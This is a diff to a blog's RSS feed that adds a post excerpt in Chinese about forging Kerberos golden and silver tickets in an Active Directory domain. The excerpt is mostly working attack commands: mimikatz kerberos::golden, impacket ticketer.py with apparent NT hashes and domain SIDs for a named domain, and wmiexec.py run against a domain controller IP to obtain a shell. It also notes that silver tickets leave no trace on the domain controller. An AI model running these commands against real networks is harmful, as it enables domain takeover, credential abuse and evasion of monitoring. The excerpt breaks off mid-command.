@@ -8,7 +8,36 @@
     <language>en</language>
     <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
 </copyright>
-    <lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 15 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Kerbrute域内票据制作</title>
+      <link>/posts/trick/</link>
+      <pubDate>Fri, 15 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/trick/</guid>
+      <description>域内票据制作 mimikatz制作票据并导入内存，完成后即可执行命令，得提前在hosts文件加入域管的主机名和ip地址，在第三步向TGT做认证的时候会经过域管，在本地做票据的时候本地解析不出域管的主机对应的ip
+kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt  查看票据
+klist  清除票据
+klist /purge  制作金票
+金票的制作用的是krbtgt的哈希，金票的制作是Kerberos认证的第一第二步，金票是KDC用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。制作的金票用户必须是域内管理员组的用户，到第三第四步会用这张金票去向TGT服务请求ST票据（请求服务的票据），如果用户不是域管理员组用户，第四步会认证错误，申请不到ST票据
+ticketer.py制作金票
+python ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator  hash一定得是krbtgt用户的哈希
+执行完会生成一张票据administrator.ccache的票据，将其加入环境变量
+set KRB5CCNAME=F:\安全工具\impacket\examples\administrator.ccache  linxu设置环境变量
+export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache  domain-sid（后面加上500就是用户的sid，去掉就是域的sid） wmiexec.py脚本用生成的金票去请求访问服务的票据ST，wmiexec得指定服务器的主机名，不能写ip，所以在自己的hosts文件得写入主机名对应的ip。impact工具包里面的不同的脚本会申请不同的ST（不同的服务的票据）
+python wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP03VM  DC是ip对应的主机名
+-dc-ip指的是域控的ip
+-debug后面跟着的是域用户的主机名（服务主机名）
+执行完会得到一个shell可以执行命令
+制作银票
+银票是ST票据，制作好后去访问对应的服务不再经过域控（KDC），用银票去访问服务在域控上不会留下痕迹。（kerberos认证的第5第6步）
+python ticketer.py -nthash 3becc9985df305dee9fdc2160b7fcc1f -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br -spn CIFS/SV-ERP03VM administrator  制作银票的hash是需要请求服务那台机器的hash
+制作完银票也得设置环境变量
+银票申请完，执行以下的脚本就是拿这张银票去访问服务
+执行对应的脚本可得到shell
+python wmiexec.py -k -no-pass -dc-ip 192.</description>
+    </item>
+    
     <item>
       <title>mssql</title>
       <link>/posts/mssql/</link>
